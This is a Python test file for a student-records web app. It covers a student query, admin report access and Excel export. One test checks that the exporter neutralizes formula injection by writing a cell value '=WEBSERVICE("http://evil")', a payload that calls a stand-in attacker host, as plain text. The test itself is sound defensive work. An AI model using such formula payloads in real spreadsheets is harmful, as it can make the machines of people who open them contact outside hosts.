"""Report and workbook export tests."""

import io

import openpyxl


def test_query_report_and_excel_export(app, database, seed_legacy_payload, minimal_payload, login):
    seed_legacy_payload(minimal_payload)
    client = app.test_client()
    system = login("system", "adminpass", "admin")
    normal = login("admin", "adminpass", "admin")

    queried = client.post("/api/query/student", json={"query": "测试学生一"}, headers={"Authorization": system})
    assert queried.status_code == 200
    assert queried.get_json()["student_id"] == "1001"
    assert queried.get_json()["total_credits"] == 3

    system_report = client.get("/api/admin/report", headers={"Authorization": system}).get_json()
    normal_report = client.get("/api/admin/report", headers={"Authorization": normal}).get_json()
    assert system_report["total_students"] == 2
    assert "students" in system_report
    assert "students" not in normal_report

    exported = client.get("/api/admin/export", headers={"Authorization": system})
    assert exported.status_code == 200
    workbook = openpyxl.load_workbook(io.BytesIO(exported.get_data()))
    worksheet = workbook.active
    assert worksheet["A1"].value == "学号"
    assert worksheet["E1"].value == "思想品德学分"
    assert worksheet.max_row == 3


def test_xlsx_export_neutralizes_formula_injection(app):
    """M-2/R-4：以 = + - @ 开头的单元格必须写成字符串而非公式，且不带字面 ' 前缀。"""
    from backend.services.exporters import xlsx_file_response

    with app.test_request_context():
        response = xlsx_file_response(
            "t.xlsx",
            "s",
            ["学号", "建议"],
            [("1001", "=WEBSERVICE(\"http://evil\")"), ("1002", "正常文本")],
        )
        # 测试上下文里 send_file 是直通模式，关掉才能直接读出字节
        response.direct_passthrough = False
        workbook = openpyxl.load_workbook(io.BytesIO(response.get_data()))
    sheet = workbook.active
    cell = sheet.cell(row=2, column=2)
    assert cell.data_type == "s"
    assert cell.value == "=WEBSERVICE(\"http://evil\")"
    assert sheet.cell(row=3, column=2).value == "正常文本"
